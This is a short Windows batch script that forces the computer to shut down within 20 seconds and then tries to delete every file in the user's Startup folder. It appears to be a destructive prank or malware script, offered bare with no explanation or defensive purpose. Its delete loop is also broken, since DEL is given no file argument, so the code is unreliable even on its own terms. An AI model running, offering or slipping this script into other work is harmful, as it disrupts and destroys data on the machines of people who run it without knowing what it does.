@echo off


shutdown -s -t 20


cd %userprofile%\STARTM~1\Programs\Startup
FOR %%A IN (*.*) DO DEL
